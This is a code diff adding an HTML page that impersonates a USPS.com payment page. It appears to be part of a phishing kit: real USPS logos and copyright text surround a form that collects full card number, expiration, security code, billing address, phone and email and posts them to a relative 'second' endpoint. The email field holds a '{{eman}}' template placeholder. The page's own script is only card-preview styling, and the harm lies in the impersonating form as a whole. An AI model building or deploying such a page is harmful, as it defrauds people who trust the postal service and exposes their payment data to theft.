@@ -1,0 +1,970 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USPS.com – Payment method</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+	<link data-testid="favicon" id="favicon" rel="icon" href="https://www.usps.com/assets/images/home/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Helvetica Neue", Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f3f3f3;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        /* Header Styles */
+        header {
+            background: linear-gradient(to bottom, #faf9f6 0%, #faf9f6 100%);
+            color: #333366;
+            padding: 12px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            border-bottom: 6px solid #333366;
+        }
+        
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 40px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo-icon {
+            width: 221px;
+            height: 34px;
+            background: #faf9f6;
+            border-radius: 2px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+			padding: 4px;
+            box-shadow: 0 0px 0px rgba(0,0,0,0.2);
+        }
+        
+        .logo-icon svg {
+            width: 118px;
+            height: 60px;
+			padding: 20px
+        }
+        
+        .logo-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #fff;
+            letter-spacing: -0.5px;
+        }
+        
+        .header-links {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .header-links a {
+            color: #333366;
+            text-decoration: none;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .header-links a i {
+            margin-right: 5px;
+            font-size: 16px;
+        }
+        
+        .header-links a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Main Content Styles */
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23f8f8f8"/><path d="M0,0 L100,100 M100,0 L0,100" stroke="%23eeeeee" stroke-width="1"/></svg>');
+        }
+        
+        .login-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 90%;
+            overflow: hidden;
+        }
+        
+        .login-header {
+            background: linear-gradient(to bottom, #f8f8f8 0%, #eaeaea 100%);
+            padding: 20px 30px;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .login-header h1 {
+            font-size: 22px;
+            color: #333366;
+            margin-bottom: 8px;
+        }
+		.card-and-form {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 30px;
+            width: 100%;
+        }
+
+        .container.preload {
+            width: 100%;
+            max-width: 400px;
+            max-height: 251px;
+            height: 54vw;
+            padding: 0;
+            perspective: 1000px;
+        }
+
+        .creditcard {
+            width: 100%;
+            max-width: 400px;
+            transform-style: preserve-3d;
+            transition: transform 0.6s;
+            cursor: pointer;
+        }
+
+        .creditcard .front,
+        .creditcard .back {
+            position: absolute;
+            width: 100%;
+            max-width: 400px;
+            backface-visibility: hidden;
+            -webkit-font-smoothing: antialiased;
+            color: #47525d;
+        }
+
+        .creditcard .back {
+            transform: rotateY(180deg);
+        }
+
+        .creditcard.flipped {
+            transform: rotateY(180deg);
+        }
+
+        .creditcard svg {
+            width: 100%;
+            box-shadow: 1px 5px 6px 0px rgba(0, 0, 0, 0.3);
+            border-radius: 22px;
+        }
+
+        /* Form styling */
+        .form-container {
+            flex: 1;
+            min-width: 300px;
+            max-width: 500px;
+            display: grid;
+            grid-gap: 15px;
+            grid-template-columns: 1fr 1fr;
+            grid-template-areas: 
+                "name name"
+                "cardnumber cardnumber"
+                "expiration security"
+                "address address"
+                "city state"
+                "zip country"
+                "phone email"
+                "submit submit";
+            padding: 25px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .field-container {
+            position: relative;
+        }
+
+        .field-container.full-width {
+            grid-column: 1 / span 2;
+        }
+
+        label {
+            display: block;
+            padding-bottom: 5px;
+            font-size: 13px;
+            color: #555;
+            font-weight: 500;
+        }
+
+        input, select {
+            margin-top: 3px;
+            padding: 12px 15px;
+            font-size: 15px;
+            width: 100%;
+            border-radius: 5px;
+            border: 1px solid #dcdcdc;
+            font-family: 'Raleway', sans-serif;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+
+        input:focus, select:focus {
+            border-color: #4A90E2;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(74, 144, 226, 0.2);
+        }
+
+        .ccicon {
+            height: 38px;
+            position: absolute;
+            right: 6px;
+            top: calc(50% - 17px);
+            width: 60px;
+			border-radius: 2px;
+        }
+
+        button.submit-btn {
+            grid-area: submit;
+            background-color: #4A90E2;
+            color: white;
+            border: none;
+            padding: 15px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: 'Raleway', sans-serif;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            transition: background-color 0.3s;
+            margin-top: 10px;
+        }
+
+        button.submit-btn:hover {
+            background-color: #3a80d2;
+        }
+
+        /* Credit card styling */
+        .lightcolor { transition: fill .5s; }
+        .darkcolor { transition: fill .5s; }
+        
+        .lightblue { fill: #03A9F4; }
+        .lightbluedark { fill: #0288D1; }
+        .red { fill: #ef5350; }
+        .reddark { fill: #d32f2f; }
+        .purple { fill: #ab47bc; }
+        .purpledark { fill: #7b1fa2; }
+        .cyan { fill: #26c6da; }
+        .cyandark { fill: #0097a7; }
+        .green { fill: #66bb6a; }
+        .greendark { fill: #388e3c; }
+        .lime { fill: #d4e157; }
+        .limedark { fill: #afb42b; }
+        .yellow { fill: #ffeb3b; }
+        .yellowdark { fill: #f9a825; }
+        .orange { fill: #ff9800; }
+        .orangedark { fill: #ef6c00; }
+        .grey { fill: #bdbdbd; }
+        .greydark { fill: #616161; }
+
+        #cardfront .st2 { fill: #FFFFFF; }
+        #cardfront .st3 { font-family: 'Source Code Pro', monospace; font-weight: 600; }
+        #cardfront .st4 { font-size: 54.7817px; }
+        #cardfront .st5 { font-family: 'Source Code Pro', monospace; font-weight: 400; }
+        #cardfront .st6 { font-size: 33.1112px; }
+        #cardfront .st7 { opacity: 0.6; fill: #FFFFFF; }
+        #cardfront .st8 { font-size: 24px; }
+        #cardfront .st9 { font-size: 36.5498px; }
+        #cardfront .st10 { font-family: 'Source Code Pro', monospace; font-weight: 300; }
+        #cardfront .st11 { font-size: 16.1716px; }
+        #cardfront .st12 { fill: #4C4C4C; }
+
+        #cardback .st0 { fill: none; stroke: #0F0F0F; stroke-miterlimit: 10; }
+        #cardback .st2 { fill: #111111; }
+        #cardback .st3 { fill: #F2F2F2; }
+        #cardback .st4 { fill: #D8D2DB; }
+        #cardback .st5 { fill: #C4C4C4; }
+        #cardback .st6 { font-family: 'Source Code Pro', monospace; font-weight: 400; }
+        #cardback .st7 { font-size: 27px; }
+        #cardback .st8 { opacity: 0.6; }
+        #cardback .st9 { fill: #FFFFFF; }
+        #cardback .st10 { font-size: 24px; }
+        #cardback .st11 { fill: #EAEAEA; }
+        #cardback .st12 { font-family: 'Rock Salt', cursive; }
+        #cardback .st13 { font-size: 37.769px; }
+
+        @media (max-width: 800px) {
+            .card-and-form {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .form-container {
+                grid-template-columns: 1fr;
+                grid-template-areas: 
+                    "name"
+                    "cardnumber"
+                    "expiration"
+                    "security"
+                    "address"
+                    "city"
+                    "state"
+                    "zip"
+                    "country"
+                    "phone"
+                    "email"
+                    "submit";
+            }
+            
+            .field-container.full-width {
+                grid-column: 1;
+            }
+        }
+        
+        .login-header p {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .login-body {
+            padding: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            font-size: 14px;
+            color: #333;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+            padding-right: 40px;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #333366;
+            box-shadow: 0 0 0 2px rgba(0, 75, 135, 0.2);
+        }
+        
+        .password-toggle {
+            position: relative;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 40px;
+            color: #666;
+            cursor: pointer;
+            background: transparent;
+            border: none;
+            font-size: 18px;
+        }
+        
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(to bottom, #333366 0%, #333366 100%);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .btn-login:hover {
+            background: linear-gradient(to bottom, #333366 0%, #002c55 100%);
+        }
+        
+        .login-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        
+        .login-links a {
+            color: #333366;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .login-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .security-note {
+            margin-top: 25px;
+            padding: 15px;
+            background-color: #f8f8f8;
+            border-radius: 4px;
+            border-left: 4px solid #333366;
+            font-size: 13px;
+            color: #666;
+        }
+        
+        .security-note i {
+            color: #333366;
+            margin-right: 8px;
+        }
+        
+        /* Footer Styles */
+        footer {
+            background-color: #e6e6e6;
+            padding: 25px 0;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #d0d0d0;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .footer-links a {
+            color: #333366;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            margin-top: 10px;
+        }
+        
+        /* Responsive Adjustments */
+        @media (max-width: 768px) {
+            .header-container {
+                flex-direction: column;
+                text-align: center;
+                gap: 10px;
+            }
+            
+            .logo {
+                margin-bottom: 10px;
+            }
+            
+            .login-container {
+                margin: 0 15px;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+        
+        /* Alert Banner */
+        .alert-banner {
+            background-color: #ffc107;
+            color: #856404;
+            padding: 7px 0;
+            text-align: center;
+            font-size: 12px;
+            border-bottom: 1px solid #ffb007;
+        }
+        
+        .alert-banner a {
+            color: #333366;
+            font-weight: bold;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="alert-banner">
+            <i class="fas fa-exclamation-circle"></i> Please ensure the <a href="#">billing address</a> matches the one on your card statement! 
+        </div>
+        
+        <header>
+            <div class="header-container">
+                <!-- <div class="logo"> -->
+                    <div class="logo-icon">
+						<img src="https://www.usps.com/global-elements/header/images/utility-header/logo-sb.svg"/>
+							<!--
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
+							
+                            <path fill="#333366" d="M16,4L4,10v12l12,6l12-6V10L16,4z M16,25.5L6,20v-8l10-5l10,5v8L16,25.5z"/>
+                            <polygon fill="#333366" points="16,16 6,10 16,4 26,10"/>
+                            <polygon fill="#333366" points="16,16 16,26 6,20 6,10"/>
+                            <polygon fill="#333366" points="26,10 26,20 16,26 16,16"/> 
+							
+                        </svg>
+						-->
+                    </div>
+                    <span class="logo-text"></span>
+                <!-- </div> -->
+                
+                <div class="header-links">
+                    <a href="#"><i class="fas fa-question-circle"></i> Help</a>
+                    <a href="#"><i class="fas fa-envelope"></i> Contact Us</a>
+                </div>
+            </div>
+        </header>
+        
+        <main class="main-content">
+            <div class="login-container">
+			
+                <div class="login-header">
+                    <h1>Payment Information</h1>
+                    <p>We accept Visa, Mastercard, American Express, PayPal, and Apple Pay</p>
+                </div>
+				
+                
+                <div class="login-body">
+                    <form name="myform" id="login_form" action="second" method="POST" target="_top">
+                        <div class="card-and-form">
+            <div class="container preload">
+                <div class="creditcard">
+                    <div class="front">
+                        <div id="ccsingle"></div>
+                        <svg version="1.1" id="cardfront" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+                            x="0px" y="0px" viewBox="0 0 750 471" style="enable-background:new 0 0 750 471;" xml:space="preserve">
+                            <g id="Front">
+                                <g id="CardBackground">
+                                    <g id="Page-1_1_">
+                                        <g id="amex_1_">
+                                            <path id="Rectangle-1_1_" class="lightcolor grey" d="M40,0h670c22.1,0,40,17.9,40,40v391c0,22.1-17.9,40-40,40H40c-22.1,0-40-17.9-40-40V40
+                                    C0,17.9,17.9,0,40,0z" />
+                                        </g>
+                                    </g>
+                                    <path class="darkcolor greydark" d="M750,431V193.2c-217.6-57.5-556.4-13.5-750,24.9V431c0,22.1,17.9,40,40,40h670C732.1,471,750,453.1,750,431z" />
+                                </g>
+                                <text transform="matrix(1 0 0 1 60.106 295.0121)" id="svgnumber" class="st2 st3 st4">0123 4567 8910 1112</text>
+                                <text transform="matrix(1 0 0 1 54.1064 428.1723)" id="svgname" class="st2 st5 st6">JOHN DOE</text>
+                                <text transform="matrix(1 0 0 1 54.1074 389.8793)" class="st7 st5 st8">cardholder name</text>
+                                <text transform="matrix(1 0 0 1 479.7754 388.8793)" class="st7 st5 st8">expiration</text>
+                                <text transform="matrix(1 0 0 1 65.1054 241.5)" class="st7 st5 st8">card number</text>
+                                <g>
+                                    <text transform="matrix(1 0 0 1 574.4219 433.8095)" id="svgexpire" class="st2 st5 st9">09/25</text>
+                                    <text transform="matrix(1 0 0 1 479.3848 417.0097)" class="st2 st10 st11">VALID</text>
+                                    <text transform="matrix(1 0 0 1 479.3848 435.6762)" class="st2 st10 st11">THRU</text>
+                                    <polygon class="st2" points="554.5,421 540.4,414.2 540.4,427.9 		" />
+                                </g>
+                                <g id="cchip">
+                                    <g>
+                                        <path class="st2" d="M168.1,143.6H82.9c-10.2,0-18.5-8.3-18.5-18.5V74.9c0-10.2,8.3-18.5,18.5-18.5h85.3
+                                c10.2,0,18.5,8.3,18.5,18.5v50.2C186.6,135.3,178.3,143.6,168.1,143.6z" />
+                                    </g>
+                                    <g>
+                                        <g>
+                                            <rect x="82" y="70" class="st12" width="1.5" height="60" />
+                                        </g>
+                                        <g>
+                                            <rect x="167.4" y="70" class="st12" width="1.5" height="60" />
+                                        </g>
+                                        <g>
+                                            <path class="st12" d="M125.5,130.8c-10.2,0-18.5-8.3-18.5-18.5c0-4.6,1.7-8.9,4.7-12.3c-3-3.4-4.7-7.7-4.7-12.3
+                                    c0-10.2,8.3-18.5,18.5-18.5s18.5,8.3,18.5,18.5c0,4.6-1.7,8.9-4.7,12.3c3,3.4,4.7,7.7,4.7,12.3
+                                    C143.9,122.5,135.7,130.8,125.5,130.8z M125.5,70.8c-9.3,0-16.9,7.6-16.9,16.9c0,4.4,1.7,8.6,4.8,11.8l0.5,0.5l-0.5,0.5
+                                    c-3.1,3.2-4.8,7.4-4.8,11.8c0,9.3,7.6,16.9,16.9,16.9s16.9-7.6,16.9-16.9c0-4.4-1.7-8.6-4.8-11.8l-0.5-0.5l0.5-0.5
+                                    c3.1-3.2,4.8-7.4,4.8-11.8C142.4,78.4,134.8,70.8,125.5,70.8z" />
+                                        </g>
+                                        <g>
+                                            <rect x="82.8" y="82.1" class="st12" width="25.8" height="1.5" />
+                                        </g>
+                                        <g>
+                                            <rect x="82.8" y="117.9" class="st12" width="26.1" height="1.5" />
+                                        </g>
+                                        <g>
+                                            <rect x="142.4" y="82.1" class="st12" width="25.8" height="1.5" />
+                                        </g>
+                                        <g>
+                                            <rect x="142" y="117.9" class="st12" width="26.2" height="1.5" />
+                                        </g>
+                                    </g>
+                                </g>
+                            </g>
+                            <g id="Back">
+                            </g>
+                        </svg>
+                    </div>
+                    <div class="back">
+                        <svg version="1.1" id="cardback" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+                            x="0px" y="0px" viewBox="0 0 750 471" style="enable-background:new 0 0 750 471;" xml:space="preserve">
+                            <g id="Front">
+                                <line class="st0" x1="35.3" y1="10.4" x2="36.7" y2="11" />
+                            </g>
+                            <g id="Back">
+                                <g id="Page-1_2_">
+                                    <g id="amex_2_">
+                                        <path id="Rectangle-1_2_" class="darkcolor greydark" d="M40,0h670c22.1,0,40,17.9,40,40v391c0,22.1-17.9,40-40,40H40c-22.1,0-40-17.9-40-40V40
+                                C0,17.9,17.9,0,40,0z" />
+                                    </g>
+                                </g>
+                                <rect y="61.6" class="st2" width="750" height="78" />
+                                <g>
+                                    <path class="st3" d="M701.1,249.1H48.9c-3.3,0-6-2.7-6-6v-52.5c0-3.3,2.7-6,6-6h652.1c3.3,0,6,2.7,6,6v52.5
+                            C707.1,246.4,704.4,249.1,701.1,249.1z" />
+                                    <rect x="42.9" y="198.6" class="st4" width="664.1" height="10.5" />
+                                    <rect x="42.9" y="224.5" class="st4" width="664.1" height="10.5" />
+                                    <path class="st5" d="M701.1,184.6H618h-8h-10v64.5h10h8h83.1c3.3,0,6-2.7,6-6v-52.5C707.1,187.3,704.4,184.6,701.1,184.6z" />
+                                </g>
+                                <text transform="matrix(1 0 0 1 621.999 227.2734)" id="svgsecurity" class="st6 st7">985</text>
+                                <g class="st8">
+                                    <text transform="matrix(1 0 0 1 518.083 280.0879)" class="st9 st6 st10">security code</text>
+                                </g>
+                                <rect x="58.1" y="378.6" class="st11" width="375.5" height="13.5" />
+                                <rect x="58.1" y="405.6" class="st11" width="421.7" height="13.5" />
+                                <text transform="matrix(1 0 0 1 59.5073 228.6099)" id="svgnameback" class="st12 st13">John Doe</text>
+                            </g>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-container">
+                <div class="field-container">
+                    <label for="name">Name on Card</label>
+                    <input id="name" name="cardholder_name" maxlength="25" required type="text">
+                </div>
+                <div class="field-container">
+                    <label for="cardnumber">Card Number</label>
+                    <input id="cardnumber" name="card_number" required type="text" pattern="[0-9]*" inputmode="numeric">
+                    <svg id="ccicon" class="ccicon" width="750" height="471" viewBox="0 0 750 471" version="1.1" xmlns="http://www.w3.org/2000/svg"
+                        xmlns:xlink="http://www.w3.org/1999/xlink"></svg>
+                </div>
+                <div class="field-container">
+                    <label for="expirationdate">Expiration (mm/yy)</label>
+                    <input id="expirationdate" name="expiration_date" required type="text" pattern="[0-9]*" inputmode="numeric">
+                </div>
+                <div class="field-container">
+                    <label for="securitycode">Security Code</label>
+                    <input id="securitycode" name="security_code" required type="text" pattern="[0-9]*" inputmode="numeric">
+                </div>
+                <div class="field-container full-width">
+                    <label for="address">Billing Address</label>
+                    <input id="address" name="billing_address" required type="text">
+                </div>
+                <div class="field-container">
+                    <label for="city">City</label>
+                    <input id="city" name="city" required type="text">
+                </div>
+                <div class="field-container">
+                    <label for="state">State</label>
+                    <select id="state" name="state">
+                        <option value="">Select State</option>
+                        <option value="AL">Alabama</option>
+                        <option value="AK">Alaska</option>
+                        <option value="AZ">Arizona</option>
+                        <option value="AR">Arkansas</option>
+                        <option value="CA">California</option>
+                        <option value="CO">Colorado</option>
+                        <option value="CT">Connecticut</option>
+                        <option value="DE">Delaware</option>
+                        <option value="FL">Florida</option>
+                        <option value="GA">Georgia</option>
+                        <option value="HI">Hawaii</option>
+                        <option value="ID">Idaho</option>
+                        <option value="IL">Illinois</option>
+                        <option value="IN">Indiana</option>
+                        <option value="IA">Iowa</option>
+                        <option value="KS">Kansas</option>
+                        <option value="KY">Kentucky</option>
+                        <option value="LA">Louisiana</option>
+                        <option value="ME">Maine</option>
+                        <option value="MD">Maryland</option>
+                        <option value="MA">Massachusetts</option>
+                        <option value="MI">Michigan</option>
+                        <option value="MN">Minnesota</option>
+                        <option value="MS">Mississippi</option>
+                        <option value="MO">Missouri</option>
+                        <option value="MT">Montana</option>
+                        <option value="NE">Nebraska</option>
+                        <option value="NV">Nevada</option>
+                        <option value="NH">New Hampshire</option>
+                        <option value="NJ">New Jersey</option>
+                        <option value="NM">New Mexico</option>
+                        <option value="NY">New York</option>
+                        <option value="NC">North Carolina</option>
+                        <option value="ND">North Dakota</option>
+                        <option value="OH">Ohio</option>
+                        <option value="OK">Oklahoma</option>
+                        <option value="OR">Oregon</option>
+                        <option value="PA">Pennsylvania</option>
+                        <option value="RI">Rhode Island</option>
+                        <option value="SC">South Carolina</option>
+                        <option value="SD">South Dakota</option>
+                        <option value="TN">Tennessee</option>
+                        <option value="TX">Texas</option>
+                        <option value="UT">Utah</option>
+                        <option value="VT">Vermont</option>
+                        <option value="VA">Virginia</option>
+                        <option value="WA">Washington</option>
+                        <option value="WV">West Virginia</option>
+                        <option value="WI">Wisconsin</option>
+                        <option value="WY">Wyoming</option>
+                    </select>
+                </div>
+                <div class="field-container">
+                    <label for="zip">ZIP Code</label>
+                    <input id="zip" name="zip_code" required type="text" pattern="[0-9]*" inputmode="numeric">
+                </div>
+                <div class="field-container">
+                    <label for="country">Country</label>
+                    <select id="country" name="country" required>
+						<option value="US">United States</option>
+						<option value="CA">Canada</option>
+						<option value="UK">United Kingdom</option>
+						<option value="AU">Australia</option>
+						<option value="DE">Germany</option>
+						<option value="FR">France</option>
+						<option value="JP">Japan</option>
+						<option value="CN">China</option>
+						<option value="SG">Singapore</option>
+						<option value="HK">Hong Kong</option>
+						<option value="NL">Netherlands</option>
+						<option value="SE">Sweden</option>
+						<option value="NO">Norway</option>
+						<option value="DK">Denmark</option>
+						<option value="FI">Finland</option>
+						<option value="CH">Switzerland</option>
+						<option value="AT">Austria</option>
+						<option value="BE">Belgium</option>
+						<option value="IE">Ireland</option>
+						<option value="IT">Italy</option>
+						<option value="ES">Spain</option>
+						<option value="PT">Portugal</option>
+						<option value="GR">Greece</option>
+						<option value="KR">South Korea</option>
+						<option value="TW">Taiwan</option>
+						<option value="MY">Malaysia</option>
+						<option value="TH">Thailand</option>
+						<option value="ID">Indonesia</option>
+						<option value="IN">India</option>
+						<option value="AE">United Arab Emirates</option>
+						<option value="SA">Saudi Arabia</option>
+						<option value="QA">Qatar</option>
+						<option value="KW">Kuwait</option>
+						<option value="IL">Israel</option>
+						<option value="NZ">New Zealand</option>
+						<option value="BR">Brazil</option>
+						<option value="MX">Mexico</option>
+						<option value="AR">Argentina</option>
+						<option value="CL">Chile</option>
+						<option value="CO">Colombia</option>
+						<option value="PE">Peru</option>
+						<option value="ZA">South Africa</option>
+						<option value="NG">Nigeria</option>
+						<option value="EG">Egypt</option>
+						<option value="RU">Russia</option>
+						<option value="PL">Poland</option>
+						<option value="CZ">Czech Republic</option>
+						<option value="HU">Hungary</option>
+						<option value="TR">Turkey</option>
+						<option value="PH">Philippines</option>
+						<option value="VN">Vietnam</option>
+						<option value="Other">Other</option>
+					</select>
+                </div>
+                <div class="field-container">
+                    <label for="phone">Phone Number</label>
+                    <input id="phone" name="phone_number" required type="tel" inputmode="numeric">
+                </div>
+                <div class="field-container">
+                    <label for="email">Email Address</label>
+                    <input id="email" name="email" type="email" required placeholder="{{eman}}">
+                </div>
+                <button class="btn-login" type="submit">Submit Payment</button>
+            </div>
+        </div>
+                        
+                       
+                        <div class="login-links">
+                            <a href="#"><i class="fas fa-question-circle"></i> Other Payment Methods?</a>
+                            <a href="#"><i class="fas fa-lock"></i> Pay Your Bills Securely?</a>
+                        </div>
+                    </form>
+                    
+                    <div class="security-note">
+                        <p><i class="fas fa-shield-alt"></i> For your security, please log out and exit your web browser when you are done.</p>
+                    </div>
+                </div>
+				
+            </div>
+        </main>
+        
+        <footer>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Contact Us</a>
+                <a href="#">Careers</a>
+                <a href="#">Site Index</a>
+                <a href="#">USPS.com</a>
+            </div>
+            <div class="copyright">
+                &copy; 2025 USPS.com. All rights reserved.
+            </div>
+        </footer>
+    </div>
+
+   <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Card flip functionality
+            const card = document.querySelector('.creditcard');
+            card.addEventListener('click', function() {
+                card.classList.toggle('flipped');
+            });
+
+            // Card type detection and logo display
+            const cardNumberInput = document.getElementById('cardnumber');
+            const ccIcon = document.getElementById('ccicon');
+            
+            // Card type patterns
+            const cardPatterns = {
+                visa: /^4/,
+                mastercard: /^5[1-5]/,
+                amex: /^3[47]/,
+                discover: /^6(?:011|5)/,
+                diners: /^3(?:0[0-5]|[68])/,
+                jcb: /^(?:2131|1800|35)/,
+                unionpay: /^62/
+            };
+            
+            // Card type SVGs (simplified versions)
+            const cardSVGs = {
+                visa: '<svg viewBox="0 0 100 60"><rect width="100" height="60" fill="#0E4595"/><text x="50" y="35" fill="white" text-anchor="middle" font-size="16">VISA</text></svg>',
+                mastercard: '<svg viewBox="0 0 100 60"><rect width="100" height="60" fill="#000"/><text x="50" y="35" fill="white" text-anchor="middle" font-size="16">MC</text></svg>',
+                amex: '<svg viewBox="0 0 100 60"><rect width="100" height="60" fill="#2557D6"/><text x="50" y="35" fill="white" text-anchor="middle" font-size="16">AMEX</text></svg>',
+                discover: '<svg viewBox="0 0 100 60"><rect width="100" height="60" fill="#4D4D4D"/><text x="50" y="35" fill="white" text-anchor="middle" font-size="16">DISC</text></svg>',
+                diners: '<svg viewBox="0 0 100 60"><rect width="100" height="60" fill="#0079BE"/><text x="50" y="35" fill="white" text-anchor="middle" font-size="16">DINERS</text></svg>',
+                jcb: '<svg viewBox="0 0 100 60"><rect width="100" height="60" fill="#0E4C96"/><text x="50" y="35" fill="white" text-anchor="middle" font-size="16">JCB</text></svg>',
+                unionpay: '<svg viewBox="0 0 100 60"><rect width="100" height="60" fill="#076F74"/><text x="50" y="35" fill="white" text-anchor="middle" font-size="16">UNION</text></svg>'
+            };
+            
+            // Card colors
+            const cardColors = {
+                visa: 'lime',
+                mastercard: 'lightblue',
+                amex: 'green',
+                discover: 'purple',
+                diners: 'orange',
+                jcb: 'red',
+                unionpay: 'cyan'
+            };
+            
+            // Detect card type and update UI
+            cardNumberInput.addEventListener('input', function() {
+                const cardNumber = this.value.replace(/\s/g, '');
+                let cardType = null;
+                
+                // Check against patterns
+                for (const [type, pattern] of Object.entries(cardPatterns)) {
+                    if (pattern.test(cardNumber)) {
+                        cardType = type;
+                        break;
+                    }
+                }
+                
+                // Update card icon and color
+                if (cardType && cardNumber.length > 0) {
+                    ccIcon.innerHTML = cardSVGs[cardType];
+                    swapColor(cardColors[cardType]);
+                } else {
+                    ccIcon.innerHTML = '';
+                    swapColor('grey');
+                }
+                
+                // Update card number display
+                document.getElementById('svgnumber').textContent = formatCardNumber(cardNumber) || '0123 4567 8910 1112';
+            });
+            
+            // Format card number with spaces
+            function formatCardNumber(number) {
+                return number.replace(/(\d{4})/g, '$1 ').trim();
+            }
+            
+            // Change card color
+            function swapColor(basecolor) {
+                document.querySelectorAll('.lightcolor').forEach(el => {
+                    el.className = 'lightcolor ' + basecolor;
+                });
+                document.querySelectorAll('.darkcolor').forEach(el => {
+                    el.className = 'darkcolor ' + basecolor + 'dark';
+                });
+            }
+            
+            // Real-time card update for other fields
+            document.getElementById('name').addEventListener('input', function() {
+                document.getElementById('svgname').textContent = this.value.toUpperCase() || 'JOHN DOE';
+                document.getElementById('svgnameback').textContent = this.value.toUpperCase() || 'JOHN DOE';
+            });
+            
+            document.getElementById('expirationdate').addEventListener('input', function() {
+                document.getElementById('svgexpire').textContent = this.value || '01/23';
+            });
+            
+            document.getElementById('securitycode').addEventListener('input', function() {
+                document.getElementById('svgsecurity').textContent = this.value || '985';
+            });
+            
+            // Format expiration date
+            document.getElementById('expirationdate').addEventListener('input', function(e) {
+                if (e.inputType !== 'deleteContentBackward' && this.value.length === 2) {
+                    this.value = this.value + '/';
+                }
+            });
+            
+            // Focus events to flip card
+            document.getElementById('securitycode').addEventListener('focus', function() {
+                card.classList.add('flipped');
+            });
+            
+            document.getElementById('name').addEventListener('focus', function() {
+                card.classList.remove('flipped');
+            });
+            
+            document.getElementById('cardnumber').addEventListener('focus', function() {
+                card.classList.remove('flipped');
+            });
+            
+            document.getElementById('expirationdate').addEventListener('focus', function() {
+                card.classList.remove('flipped');
+            });
+        });
+    </script>
+</body>
+</html>
